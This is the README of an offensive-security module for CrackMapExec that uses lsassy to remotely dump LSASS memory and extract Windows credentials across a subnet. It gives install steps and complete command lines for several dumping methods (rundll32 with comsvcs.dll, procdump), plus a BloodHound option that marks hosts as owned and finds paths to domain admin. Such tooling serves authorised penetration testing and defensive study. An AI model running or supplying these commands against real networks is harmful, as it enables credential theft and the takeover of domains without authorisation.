# lsassy CrackMapExec Module

![CrackMapExec >= 4.0.1](https://img.shields.io/badge/CrackMapExec-%3E=4.0.1-red)

This CME module uses **lsassy** to remotely extract lsass password, and optionally interacts with Bloodhound to **set compromised hosts as owned** and check if compromised users have a **path to domain admin**.

![CME Module example](https://github.com/Hackndo/lsassy/raw/master/assets/example_cme.png)

## Requirements

* Python2.7
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* Python3.6+
  - [lsassy](https://github.com/Hackndo/lsassy/)


## Installation

* Install **lsassy**

### Python2

* Download [lsassy CrackMapExec module](https://raw.githubusercontent.com/Hackndo/lsassy/master/cme/lsassy.py)
* Copy `lsassy.py` in `[CrackMapExec Path]/cme/modules`
* Reinstall CrackMapExec using python2.7 `python setup.py install`

```bash
python3 -m pip install lsassy
wget https://raw.githubusercontent.com/Hackndo/lsassy/master/cme/lsassy.py
cp lsassy.py /opt/CrackMapExec/cme/modules/
cd /opt/CrackMapExec
python2.7 setup.py install
```

### Python3

* Download [lsassy CrackMapExec module](https://raw.githubusercontent.com/Hackndo/lsassy/master/cme/lsassy3.py)
* Copy `lsassy3.py` in `[CrackMapExec Path]/cme/modules`
* Reinstall CrackMapExec using python3 `python setup.py install`

```bash
python3 -m pip install lsassy
wget https://raw.githubusercontent.com/Hackndo/lsassy/master/cme/lsassy3.py
cp lsassy3.py /opt/CrackMapExec/cme/modules/
cd /opt/CrackMapExec
python3 setup.py install
```

## Usage

### Basic

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
```

### Advanced

By default, this module uses `rundll32.exe` with `comsvcs.dll` DLL to dump lsass process on the remote host, with method **1** of lsassy.

If you want to specify the dumping method, use the `METHOD` option (`lsassy -h` for more details)

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=3
```

If you're using a method that requires procdump, you can specify procdump location with `PROCDUMP_PATH` option.

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=2 PROCDUMP_PATH=/opt/Sysinternals/procdump.exe
```

By default, lsass dump name is randomly generated. If you want to specify a dump name, you can use `REMOTE_LSASS_DUMP` option.

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o REMOTE_LSASS_DUMP=LSASSY_DUMP.dmp
```

### BloodHound

You can set BloodHound integration using `-o BLOODHOUND=True` flag. This flag enables different checks :
* Set "owned" on BloodHound computer nodes that are compromised
* Detect compromised users that have a **path to domain admin**

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o BLOODHOUND=True
```

You can check available options using

```
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --options
[*] lsassy module options:

            METHOD              Method to use to dump procdump with lsassy. See lsassy -h for more details
            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: Random)
            PROCDUMP_PATH       Path to procdump on attacker host. If this is not set, "rundll32" method is used
            BLOODHOUND          Enable Bloodhound integration (default: false)
            NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
            NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
            NEO4JUSER           Username for Neo4j database (default: 'neo4j')
            NEO4JPASS           Password for Neo4j database (default: 'neo4j')
            WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')

```

## Issue

If you find an issue with this tool (that's very plausible !), please

* Check that you're using the latest version
* Send as much details as possible.
    - For standalone **lsassy**, please use the `-d` debug flag
    - For CME module, please use CrackMapExec `--verbose` flag

Have fun
